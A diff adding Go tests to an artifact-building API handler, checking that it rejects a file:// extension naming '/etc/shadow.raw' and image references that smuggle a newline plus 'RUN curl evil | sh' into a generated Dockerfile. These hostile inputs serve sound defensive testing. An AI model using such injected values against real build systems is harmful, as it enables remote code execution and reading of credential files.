@@ -118,6 +118,61 @@ var _ = Describe("ArtifactHandler", func() {
 			Expect(fb.builds).To(BeEmpty())
 		})
 
+		It("returns 400 for an extension that names a file on this server", func() {
+			// file:// is the CLI's way of baking an image the operator already
+			// has. Accepting it here would read any file this process can
+			// reach and hand it back inside the artifact.
+			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"extensions":["file:///etc/shadow.raw"]}`
+			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+			req.Header.Set("Content-Type", "application/json")
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+
+			Expect(handler.Create(c)).To(Succeed())
+			Expect(rec.Code).To(Equal(http.StatusBadRequest))
+
+			var resp map[string]string
+			Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
+			Expect(resp["error"]).To(ContainSubstring("not allowed over the API"))
+			Expect(fb.builds).To(BeEmpty())
+		})
+
+		DescribeTable("returns 400 for an image reference that would add lines to a generated Dockerfile",
+			func(jsonField, described string) {
+				// The JSON escape decodes to a real newline: written into a FROM
+				// line it would append a RUN instruction to the build.
+				body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"` + jsonField + `":"quay.io/kairos/ubuntu:24.04\nRUN curl evil | sh"}`
+				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+				req.Header.Set("Content-Type", "application/json")
+				rec := httptest.NewRecorder()
+				c := e.NewContext(req, rec)
+
+				Expect(handler.Create(c)).To(Succeed())
+				Expect(rec.Code).To(Equal(http.StatusBadRequest))
+
+				var resp map[string]string
+				Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
+				Expect(resp["error"]).To(ContainSubstring(described))
+				Expect(fb.builds).To(BeEmpty())
+			},
+			Entry("baseImage", "baseImage", "base image"),
+			Entry("kairosInitImage", "kairosInitImage", "kairos-init image"),
+			Entry("hadronBase", "hadronBase", "hadron base"),
+		)
+
+		It("accepts every image field when each holds a valid reference", func() {
+			body := `{"baseImage":"ubuntu:24.04","kairosInitImage":"quay.io/kairos/kairos-init:v0.5.0","hadronBase":"localhost:5000/kairos/hadron@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef","outputs":{"iso":true}}`
+			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
+			req.Header.Set("Content-Type", "application/json")
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+
+			Expect(handler.Create(c)).To(Succeed())
+			Expect(rec.Code).To(Equal(http.StatusCreated))
+			// The reference reaches the builder as the user wrote it.
+			Expect(fb.lastOpts.BaseImage).To(Equal("ubuntu:24.04"))
+		})
+
 		It("returns 500 for a genuine server failure", func() {
 			fb.buildErr = fmt.Errorf("disk full")
 
